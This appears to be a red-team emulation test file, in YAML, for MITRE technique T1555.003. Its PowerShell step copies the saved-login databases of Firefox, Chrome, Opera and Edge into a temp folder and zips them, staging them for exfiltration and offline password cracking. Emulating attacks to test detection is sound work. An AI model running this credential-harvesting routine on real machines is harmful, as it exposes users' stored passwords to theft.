---
api_version: 2.0
uuid: 45cc14c8-5c2e-4a07-82d0-2390f3d9ef16
name: Stage Popular Credential Files for Exfiltration
description: |
  This test is designed to search a drive for credential files used by the most common web browsers on Windows (Firefox, Chrome, Opera, and Edge), export the found files to a folder, and zip it,
  simulating how an adversary might stage sensitive credential files for exfiltration in order to conduct offline password extraction with tools like [firepwd.py](https://github.com/lclevy/firepwd) or [HackBrowserData](https://github.com/moonD4rk/HackBrowserData).
  Derived from https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555.003/T1555.003.md#atomic-test-10---stage-popular-credential-files-for-exfiltration
requirements:
  platforms:
    - os: windows
mitre:
  tactics:
    - TA0006 Credential Access
  techniques:
    - T1555 Credentials from Password Stores
  subtechniques:
    - T1555.003 Credentials from Web Browsers

args:
  - name: exfil_folder
    description: destination location for exfil folder
    type: string
    default: $env:temp\T1555.003

steps:
  - name: staging_cred_files_exfil
    executor: powershell
    inline: |
      if (-not (test-path "{{.Args.exfil_folder}}")) {
        new-item -path "$env:temp" -Name "T1555.003" -ItemType "directory" -force
        }

      $FirefoxCredsLocation = get-childitem -path "$env:appdata\Mozilla\Firefox\Profiles\*.default-release\"

      if (test-path "$FirefoxCredsLocation\key4.db") {
        copy-item "$FirefoxCredsLocation\key4.db" -destination "{{.Args.exfil_folder}}\T1555.003Firefox_key4.db"
        }

      if (test-path "$FirefoxCredsLocation\logins.json") {
        copy-item "$FirefoxCredsLocation\logins.json" -destination "{{.Args.exfil_folder}}\T1555.003Firefox_logins.json"
        }

      if (test-path "$env:localappdata\Google\Chrome\User Data\Default\Login Data") {
        copy-item "$env:localappdata\Google\Chrome\User Data\Default\Login Data" -destination "{{.Args.exfil_folder}}\T1555.003Chrome_Login Data"
        }

      if (test-path "$env:localappdata\Google\Chrome\User Data\Default\Login Data For Account") {
        copy-item "$env:localappdata\Google\Chrome\User Data\Default\Login Data For Account" -destination "{{.Args.exfil_folder}}\T1555.003Chrome_Login Data For Account"
        }

      if (test-path "$env:appdata\Opera Software\Opera Stable\Login Data") {
        copy-item "$env:appdata\Opera Software\Opera Stable\Login Data" -destination "{{.Args.exfil_folder}}\T1555.003Opera_Login Data"
        }

      if (test-path "$env:localappdata/Microsoft/Edge/User Data/Default/Login Data") {
        copy-item "$env:localappdata/Microsoft/Edge/User Data/Default/Login Data" -destination "{{.Args.exfil_folder}}\T1555.003Edge_Login Data"
        }

      compress-archive -path "{{.Args.exfil_folder}}" -destinationpath "{{.Args.exfil_folder}}.zip" -force

    cleanup:
      executor: powershell
      inline: |
        Remove-Item -Path "$env:temp\T1555.003.zip" -force -erroraction silentlycontinue
        Remove-Item -Path "$env:temp\T1555.003\" -force -recurse -erroraction silentlycontinue
